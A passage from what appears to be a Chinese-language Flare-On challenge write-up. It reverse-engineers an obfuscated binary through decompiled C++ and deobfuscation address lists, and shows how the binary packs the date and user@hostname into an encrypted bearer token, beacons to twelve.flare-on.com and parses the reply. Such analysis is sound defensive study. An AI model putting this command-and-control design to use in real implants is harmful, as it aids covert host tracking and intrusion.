class="built_in">sub_7FF6B5E46560</span>(v29);</span><br><span class="line">    v4 = <span class="built_in">sub_7FF6B5E4E3D0</span>(v3);</span><br><span class="line">    v5 = <span class="built_in">sub_7FF6B5EEF1B0</span>(v31, v4);</span><br><span class="line">    v6 = <span class="built_in">sub_7FF6B5E464D0</span>(&amp;v28);</span><br><span class="line">    v7 = <span class="built_in">sub_7FF6B5E50290</span>(v6);</span><br><span class="line">    v8 = <span class="built_in">sub_7FF6B5EEF1B0</span>(v30, v7);</span><br><span class="line">    <span class="built_in">sub_7FF6B5C74C50</span>(v8, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_7FF6B5C56CF0</span>(v37, v36);</span><br><span class="line">  v27 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="built_in">sub_7FF6B5E46640</span>(&amp;v27);</span><br><span class="line">  v10 = <span class="built_in">sub_7FF6B5E4C510</span>(v9);</span><br><span class="line">  v11 = <span class="built_in">sub_7FF6B5EEF1B0</span>(v32, v10);</span><br><span class="line">  v12 = <span class="built_in">sub_7FF6B604F6E0</span>(v36, v11);</span><br><span class="line">  `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v32);</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    v26 = <span class="number">0</span>;</span><br><span class="line">    v25 = <span class="number">0</span>;</span><br><span class="line">    v13 = <span class="built_in">sub_7FF6B5E46700</span>(&amp;v26);</span><br><span class="line">    v14 = <span class="built_in">sub_7FF6B5E48790</span>(v13);</span><br><span class="line">    v15 = <span class="built_in">sub_7FF6B5EEF1B0</span>(v34, v14);</span><br><span class="line">    v16 = <span class="built_in">sub_7FF6B5E466A0</span>(&amp;v25);</span><br><span class="line">    v17 = <span class="built_in">sub_7FF6B5E4A650</span>(v16);</span><br><span class="line">    v18 = <span class="built_in">sub_7FF6B5EEF1B0</span>(v33, v17);</span><br><span class="line">    <span class="built_in">sub_7FF6B5C74C50</span>(v18, v15);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset_with_0</span>(v35, <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_7FF6B5C2CF30</span>(v35, v36);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">BigFunc2</span>(v35, v37) ) <span class="comment">//这两个函数是调用AES加解密函数的大函数</span></span><br><span class="line">      <span class="built_in">Call_BigFunc3</span>(v35, v37);</span><br><span class="line">    <span class="built_in">sub_7FF6B5C2D630</span>(v35);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">catch</span> ( <span class="type">const</span> std::exception *&amp;v29[<span class="number">3</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)&amp;v29[<span class="number">3</span>] + <span class="number">8LL</span>))(*(_QWORD *)&amp;v29[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">sub_7FF6B5EEF1B0</span>(&amp;v29[<span class="number">11</span>], v20);</span><br><span class="line">    v24 = <span class="number">0</span>;</span><br><span class="line">    v21 = <span class="built_in">sub_7FF6B5E46790</span>(&amp;v24);</span><br><span class="line">    v22 = <span class="built_in">sub_7FF6B5E468D0</span>(v21);</span><br><span class="line">    v23 = <span class="built_in">sub_7FF6B5EEF1B0</span>(&amp;v34[<span class="number">32</span>], v22);</span><br><span class="line">    <span class="built_in">sub_7FF6B5C74C50</span>(v23, &amp;v29[<span class="number">11</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v36);</span><br><span class="line">  <span class="built_in">sub_7FF6B5E467F0</span>(v37);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么，现在可以用相同的方法解混淆其他函数，比如BigFunc1（0x7FF6B5CA1590）：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">START_EA = [<span class="number">0x7FF6B5CA15BF</span>, <span class="number">0x7FF6B5CA7974</span>, <span class="number">0x7FF6B5CAE1BF</span>, <span class="number">0x7FF6B5CB1603</span>, <span class="number">0x7FF6B5CB481B</span>, <span class="number">0x7FF6B5CB8037</span>, <span class="number">0x7FF6B5CBB8CE</span>, <span class="number">0x7FF6B5CBEC51</span>, <span class="number">0x7FF6B5CC219F</span>, <span class="number">0x7FF6B5CC54BE</span>, <span class="number">0x7FF6B5CC8F6F</span>, <span class="number">0x7FF6B5CCC244</span>, <span class="number">0x7FF6B5CCF593</span>, <span class="number">0x7FF6B5CD2CAF</span>, <span class="number">0x7FF6B5CD61A4</span>, <span class="number">0x7FF6B5CD9537</span>, <span class="number">0x7FF6B5CDCF8B</span>, <span class="number">0x7FF6B5CE0443</span>, <span class="number">0x7FF6B5CE38CD</span>, <span class="number">0x7FF6B5CE6D25</span>, <span class="number">0x7FF6B5CE9FDA</span>, <span class="number">0x7FF6B5CED27B</span>, <span class="number">0x7FF6B5CF0634</span>]</span><br><span class="line">END_EA   = [<span class="number">0x7FF6B5CA7965</span>, <span class="number">0x7FF6B5CAE1A9</span>, <span class="number">0x7FF6B5CB15BB</span>, <span class="number">0x7FF6B5CB4805</span>, <span class="number">0x7FF6B5CB8021</span>, <span class="number">0x7FF6B5CBB8B0</span>, <span class="number">0x7FF6B5CBEC3C</span>, <span class="number">0x7FF6B5CC2167</span>, <span class="number">0x7FF6B5CC5498</span>, <span class="number">0x7FF6B5CC8C66</span>, <span class="number">0x7FF6B5CCC1BE</span>, <span class="number">0x7FF6B5CCF446</span>, <span class="number">0x7FF6B5CD2B7A</span>, <span class="number">0x7FF6B5CD60C2</span>, <span class="number">0x7FF6B5CD9512</span>, <span class="number">0x7FF6B5CDCE84</span>, <span class="number">0x7FF6B5CE039E</span>, <span class="number">0x7FF6B5CE382B</span>, <span class="number">0x7FF6B5CE6CC9</span>, <span class="number">0x7FF6B5CE9F74</span>, <span class="number">0x7FF6B5CED172</span>, <span class="number">0x7FF6B5CF0574</span>, <span class="number">0x7FF6B5CF37CC</span>]</span><br></pre></td></tr></table></figure>

<p>反编译出来的BigFunc1并调试:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">BigFunc1</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Time = <span class="built_in">time64</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">gmtime64_s</span>(&amp;Tm, &amp;Time);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">  v1 = <span class="built_in">sub_7FF7BED73850</span>(&amp;buf);</span><br><span class="line">  Format = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_7FF7BEF39E30</span>(v1);</span><br><span class="line">  <span class="built_in">strftime</span>(Buffer, <span class="number">0xBu</span>, Format, &amp;Tm); <span class="comment">//获取日期和UTC+0小时（10字节）</span></span><br><span class="line">  <span class="built_in">sub_7FF7BEF6F1B0</span>(v140, Buffer);</span><br><span class="line">  <span class="built_in">sub_7FF7BECD7060</span>(a1, v139); <span class="comment">//获取用户名@主机名，截断到22字节</span></span><br><span class="line">  <span class="built_in">sub_7FF7BF0CF520</span>(v138); <span class="comment">//组合到时间后面，成为32字节</span></span><br><span class="line">  len = <span class="built_in">add_with_16</span>(v138); <span class="comment">//获取长度（0x20）</span></span><br><span class="line">  <span class="built_in">memset_with_0</span>(v135, <span class="number">24</span>);</span><br><span class="line">  v3 = <span class="built_in">sub_7FF7BEF54AF0</span>(v36);</span><br><span class="line">  <span class="built_in">sub_7FF7BEF54A90</span>(v135, len, v3);</span><br><span class="line">  v4 = <span class="built_in">sub_7FF7BECA1F60</span>(v135);</span><br><span class="line">  <span class="built_in">AES_INV_SBOX_REPLACE</span>(v138, v4, len); <span class="comment">//对上面的组合明文进行了替换，结果写入v4</span></span><br></pre></td></tr></table></figure>

<p>到这里已经可以对消息的第一条中出现的<font color=lime><strong>Bearer e4b8058f06f7061e8f0f8ed15d23865ba2427b23a695d9b27bc308a26d</strong></font>进行解密了，解密结果为<font color=LimeGreen><strong>2025082006TheBoss@THUNDERNODE</strong></font>，这个数据不足32字节，暂时不知道有什么用，继续调试：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset_with_0</span>(v143, <span class="number">64</span>);</span><br><span class="line"><span class="built_in">memset</span>(buf__1, <span class="number">0</span>, <span class="number">1u</span>);</span><br><span class="line">v5 = <span class="built_in">sub_7FF7BED738C0</span>(buf__1);</span><br><span class="line">v6 = <span class="built_in">sub_7FF7BEF37F70</span>(v5);</span><br><span class="line">v42 = <span class="built_in">sub_7FF7BEF6F1B0</span>(v118, v6);</span><br><span class="line">v43 = v42;</span><br><span class="line">v47 = v42;</span><br><span class="line"><span class="built_in">memset</span>(&amp;buf__2, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf__2));</span><br><span class="line">v7 = <span class="built_in">sub_7FF7BED73930</span>(&amp;buf__2);</span><br><span class="line">v8 = <span class="built_in">sub_7FF7BEF360B0</span>(v7);</span><br><span class="line">v44 = <span class="built_in">sub_7FF7BEF6F1B0</span>(v112, v8);</span><br><span class="line">v45 = v44;</span><br><span class="line">v46 = v44;</span><br><span class="line"><span class="built_in">sub_7FF7BF0D1970</span>(v124, v47, v44);</span><br><span class="line"><span class="built_in">memset</span>(&amp;buf__3, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf__3));</span><br><span class="line">v9 = <span class="built_in">sub_7FF7BED73A20</span>(&amp;buf__3);</span><br><span class="line">v10 = <span class="built_in">sub_7FF7BEF341F0</span>(v9);</span><br><span class="line">v48 = <span class="built_in">sub_7FF7BEF6F1B0</span>(v113, v10);</span><br><span class="line">v49 = v48;</span><br><span class="line">v57 = v48;</span><br><span class="line"><span class="built_in">memset</span>(&amp;buf__4, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf__4));</span><br><span class="line">v11 = <span class="built_in">sub_7FF7BECA1F60</span>(v135);</span><br><span class="line">v50 = <span class="built_in">sub_7FF7BECFE990</span>(v114, v11, jumpbuf_sp);</span><br><span class="line">v52 = v50;</span><br><span class="line">v12 = <span class="built_in">sub_7FF7BED73A90</span>(&amp;buf__4);</span><br><span class="line">v13 = <span class="built_in">sub_7FF7BEF32330</span>(v12);</span><br><span class="line">v51 = <span class="built_in">sub_7FF7BEF6F1B0</span>(v116, v13);</span><br><span class="line">v53 = v51;</span><br><span class="line">v54 = <span class="built_in">sub_7FF7BF0CF5F0</span>(v117, v51, v52);</span><br><span class="line">v41 = v54;</span><br><span class="line">v56 = v54;</span><br><span class="line"><span class="built_in">sub_7FF7BF0D1970</span>(v125, v57, v54);</span><br><span class="line"><span class="built_in">qmemcpy</span>(dst, (<span class="type">const</span> <span class="type">void</span> *)<span class="built_in">unknown_libname_29</span>(v111, v124, v126), <span class="number">0x10u</span>);</span><br><span class="line"><span class="built_in">sub_7FF7BEF6E7B0</span>(v143, dst);</span><br><span class="line">`eh vector destructor iterator<span class="string">&#x27;(v124, 0x40u, 2u, sub_7FF7BECA4B50);</span></span><br><span class="line"><span class="string">`std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(v117);</span></span><br><span class="line"><span class="string">`std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(v116);</span></span><br><span class="line"><span class="string">`std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(v114);</span></span><br><span class="line"><span class="string">`std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(v113);</span></span><br><span class="line"><span class="string">`std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(v112);</span></span><br><span class="line"><span class="string">`std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(v118);</span></span><br><span class="line"><span class="string">memset_with_0(v131, 8);</span></span><br><span class="line"><span class="string">v58 = sub_7FF7BECD6CB0(a1, v110);</span></span><br></pre></td></tr></table></figure>

<p>这部分构造了HTTP请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-Agent</span><br><span class="line">Mozilla/5.0 (Avocado OS; 1-Core Toaster) AppleWebKit/537.36 (XML, like Gecko) FLARE/1.0</span><br><span class="line">Authorization</span><br><span class="line">Bearer e4b8058f06e406052c3f7b0b7b3244c20b95ffce95a65466964c2e9508d9a285</span><br><span class="line">twelve.flare-on.com</span><br></pre></td></tr></table></figure>

<p>就是上面的第一次发送的请求，继续分析：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">v59 = v58;</span><br><span class="line">v37 = <span class="built_in">sub_7FF7BECD6CE0</span>(a1);</span><br><span class="line">v103 = <span class="built_in">sub_7FF7BECAD5D0</span>(v131, v59, v37);</span><br><span class="line">`std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v110);</span><br><span class="line"><span class="built_in">memset_with_0</span>(v142, <span class="number">80</span>);</span><br><span class="line">v60 = v128;</span><br><span class="line"><span class="built_in">memset</span>(&amp;buf__5, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf__5));</span><br><span class="line">v61 = <span class="built_in">sub_7FF7BEF53BE0</span>(v128, <span class="number">0</span>);</span><br><span class="line">v65 = v61;</span><br><span class="line">v62 = <span class="built_in">sub_7FF7BED73B00</span>(&amp;buf__5);</span><br><span class="line">v63 = <span class="built_in">sub_7FF7BEF30470</span>(v62);</span><br><span class="line">v64 = <span class="built_in">sub_7FF7BEF6F1B0</span>(v109, v63);</span><br><span class="line">v66 = v64;</span><br><span class="line">v104 = <span class="built_in">sub_7FF7BECAD790</span>(v131, v142, v64, v143, v65);</span><br><span class="line">`std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v109);</span><br><span class="line">HasCapturedContext = Concurrency::details::_ContextCallback::_HasCapturedContext((Concurrency::details::_ContextCallback *)v142);</span><br><span class="line"><span class="keyword">if</span> ( !HasCapturedContext || (v67 = <span class="built_in">sub_7FF7BECA1F60</span>(v142), *(_DWORD *)(v67 + <span class="number">32</span>) != <span class="number">200</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf__6, <span class="number">0</span>, <span class="number">1u</span>);</span><br><span class="line">  v98 = <span class="built_in">sub_7FF7BED73DA0</span>(&amp;buf__6);</span><br><span class="line">  v99 = <span class="built_in">sub_7FF7BEF22D30</span>(v98);</span><br><span class="line">  v100 = <span class="built_in">sub_7FF7BEF6F1B0</span>(v123, v99);</span><br><span class="line">  v101 = v100;</span><br><span class="line">  v38 = <span class="built_in">sub_7FF7BECA1F70</span>(v142);</span><br><span class="line">  <span class="built_in">exit_1</span>(Code[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这部分在抓包，没抓到包或者响应不是200就从这里退出了</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">  v68 = v129;</span><br><span class="line">  v69 = <span class="built_in">sub_7FF7BEF53BE0</span>(v129, <span class="number">0</span>);</span><br><span class="line">  v70 = v69;</span><br><span class="line">  v55 = <span class="built_in">sub_7FF7BECA1F60</span>(v142);</span><br><span class="line">  <span class="built_in">LOBYTE</span>(v14) = <span class="number">1</span>;</span><br><span class="line">  v105 = <span class="built_in">sub_7FF7BF0D19D0</span>((<span class="type">unsigned</span> <span class="type">int</span>)v133, (<span class="type">int</span>)v55 + <span class="number">200</span>, v70, v14, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf__7, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf__7));</span><br><span class="line">  v71 = <span class="built_in">sub_7FF7BED73B60</span>(&amp;buf__7);</span><br><span class="line">  v72 = <span class="built_in">sub_7FF7BEF2E5B0</span>(v71);</span><br><span class="line">  v73 = <span class="built_in">sub_7FF7BEF6F1B0</span>(v119, v72);</span><br><span class="line">  v74 = v73;</span><br><span class="line">  v24 = <span class="built_in">sub_7FF7BEF53ED0</span>(v133, v73);</span><br><span class="line">  v25 = v24;</span><br><span class="line">  `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v119);</span><br><span class="line">  <span class="keyword">if</span> ( v25 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset_with_0</span>(v136, <span class="number">24</span>);</span><br><span class="line">    v77 = v126;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;buf__8, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf__8));</span><br><span class="line">    v75 = <span class="built_in">sub_7FF7BED73BC0</span>(&amp;buf__8);</span><br><span class="line">    v76 = <span class="built_in">sub_7FF7BEF2C6F0</span>(v75);</span><br><span class="line">    v78 = <span class="built_in">sub_7FF7BEF6F1B0</span>(v77, v76);</span><br><span class="line">    v79 = <span class="built_in">sub_7FF7BEF54000</span>(v133, v78);</span><br><span class="line">    v106 = <span class="built_in">sub_7FF7BF0D1B20</span>(v79, v108);</span><br><span class="line">    v102 = <span class="built_in">sub_7FF7BED06A60</span>(v136, v108);</span><br><span class="line">    `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v108);</span><br><span class="line">    dst[<span class="number">2</span>] = <span class="built_in">sub_7FF7BED06BA0</span>(v141, v136, v139);</span><br><span class="line">    v80 = v130;</span><br><span class="line">    v81 = <span class="built_in">sub_7FF7BEF53BE0</span>(v130, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v15) = <span class="number">1</span>;</span><br><span class="line">    dst[<span class="number">3</span>] = <span class="built_in">sub_7FF7BF0D19D0</span>((<span class="type">unsigned</span> <span class="type">int</span>)v132, (<span class="type">unsigned</span> <span class="type">int</span>)v141, v81, v15, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;buf__9, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf__9));</span><br><span class="line">    v82 = <span class="built_in">sub_7FF7BED73C20</span>(&amp;buf__9);</span><br><span class="line">    v83 = <span class="built_in">sub_7FF7BEF2A830</span>(v82);</span><br><span class="line">    v84 = <span class="built_in">sub_7FF7BEF6F1B0</span>(v115, v83);</span><br><span class="line">    v85 = v84;</span><br><span class="line">    v28 = <span class="built_in">sub_7FF7BEF53ED0</span>(v132, v84);</span><br><span class="line">    v29 = v28;</span><br><span class="line">    `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v115);</span><br><span class="line">    <span class="keyword">if</span> ( v29 )</span><br><span class="line">    &#123;</span><br><span class="line">      v88 = &amp;v127;</span><br><span class="line">      <span class="built_in">memset</span>(&amp;buf__10, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf__10));</span><br><span class="line">      v86 = <span class="built_in">sub_7FF7BED73C80</span>(&amp;buf__10);</span><br><span class="line">      v87 = <span class="built_in">sub_7FF7BEF28970</span>(v86);</span><br><span class="line">      v89 = <span class="built_in">sub_7FF7BEF6F1B0</span>(v88, v87);</span><br><span class="line">      v90 = <span class="built_in">sub_7FF7BEF54000</span>(v132, v89);</span><br><span class="line">      dst[<span class="number">4</span>] = <span class="built_in">sub_7FF7BF0D1B20</span>(v90, v137);</span><br><span class="line">      <span class="built_in">memset</span>(&amp;buf__11, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf__11));</span><br><span class="line">      v91 = <span class="built_in">sub_7FF7BED73CE0</span>(&amp;buf__11);</span><br><span class="line">      v92 = <span class="built_in">sub_7FF7BEF26AB0</span>(v91);</span><br><span class="line">      v93 = <span class="built_in">sub_7FF7BEF6F1B0</span>(v120, v92);</span><br><span class="line">      v16 = (<span class="type">unsigned</span> __int8 *)<span class="built_in">sub_7FF7BEF6EE40</span>(v93, <span class="number">0</span>);</span><br><span class="line">      v40 = <span class="built_in">sub_7FF7BEF6EC30</span>(v137, *v16, <span class="number">0</span>);</span><br><span class="line">      `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v120);</span><br><span class="line">      <span class="keyword">if</span> ( v40 != <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v94 = <span class="built_in">sub_7FF7BEF6EBD0</span>(v137, v121, <span class="number">0</span>, v40);</span><br><span class="line">        v95 = v94;</span><br><span class="line">        <span class="built_in">sub_7FF7BECD2650</span>(a1, v94);</span><br><span class="line">        `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v121);</span><br><span class="line">        v96 = <span class="built_in">sub_7FF7BEF6EBD0</span>(v137, v122, v40 + <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        v97 = v96;</span><br><span class="line">        <span class="built_in">sub_7FF7BECD49D0</span>(a1, v96);</span><br><span class="line">        `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v122);</span><br><span class="line">        v32 = <span class="number">1</span>;</span><br><span class="line">        `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v137);</span><br><span class="line">        <span class="built_in">sub_7FF7BEDCC680</span>(v132);</span><br><span class="line">        `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v141);</span><br><span class="line">        <span class="built_in">sub_7FF7BEF54A30</span>(v136);</span><br><span class="line">        <span class="built_in">sub_7FF7BEDCC680</span>(v133);</span><br><span class="line">        <span class="built_in">sub_7FF7BECA7B70</span>(v142);</span><br><span class="line">        <span class="built_in">sub_7FF7BECAD630</span>(v131);</span><br><span class="line">        <span class="built_in">sub_7FF7BECA1E30</span>(v143);</span><br><span class="line">        <span class="built_in">sub_7FF7BEF54A30</span>(v135);</span><br><span class="line">        `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v138);</span><br><span class="line">        `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v139);</span><br><span class="line">        `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v140);</span><br><span class="line">        <span class="keyword">return</span> v32;</span><br><span class="line">      &#125;</span><br><span class="line">      `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v137);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sub_7FF7BEDCC680</span>(v132);</span><br><span class="line">    `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v141);</span><br><span class="line">    <span class="built_in">sub_7FF7BEF54A30</span>(v136);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_7FF7BEDCC680</span>(v133);</span><br><span class="line">  <span class="built_in">sub_7FF7BECA7B70</span>(v142);</span><br><span class="line">  <span class="built_in">sub_7FF7BECAD630</span>(v131);</span><br><span class="line">  <span class="built_in">BYTE2</span>(buf__6) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sub_7FF7BECA1E30</span>(v143);</span><br><span class="line">  <span class="built_in">sub_7FF7BEF54A30</span>(v135);</span><br><span class="line">  `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v138);</span><br><span class="line">  `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v139);</span><br><span class="line">  `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v140);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">BYTE2</span>(buf__6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后面这部分处理了包的内容，提取其中有效的信息：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 